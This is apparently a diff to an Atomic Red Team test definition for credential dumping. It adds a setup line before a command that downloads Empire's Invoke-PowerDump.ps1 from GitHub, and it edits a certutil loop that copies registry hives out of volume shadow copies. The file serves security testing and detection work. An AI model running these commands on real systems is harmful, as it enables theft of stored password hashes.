@@ -93,6 +93,7 @@ atomic_tests:
   - description: PowerDump script must exist on disk at specified location
     prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {exit 0} else {exit 1} '
     get_prereq_command: |-
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
   executor:
     command: |-
@@ -120,7 +121,7 @@ atomic_tests:
       default: 10
   executor:
     command: |
-      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
+      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
     name: command_prompt
     elevation_required: false
     cleanup_command: |
